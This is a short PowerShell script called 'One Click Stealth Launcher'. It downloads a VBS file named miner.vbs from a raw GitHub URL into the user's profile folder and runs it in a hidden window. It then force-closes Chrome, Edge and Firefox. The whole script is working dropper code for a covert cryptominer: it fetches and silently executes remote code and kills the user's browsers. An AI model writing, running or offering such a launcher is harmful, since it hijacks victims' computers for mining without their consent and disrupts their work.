# One Click Stealth Launcher
$url = "https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/miner.vbs"
$output = "$env:USERPROFILE\temp-miner.vbs"

# Download the VBS file invisibly
Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

# Run the VBS file invisibly
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("wscript.exe " + $output), 0, False

# --- BROWSER KILLER ---
# Closes Chrome, Edge, and Firefox to leave them with a clean slate
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue
Stop-Process -Name firefox -Force -ErrorAction SilentlyContinue

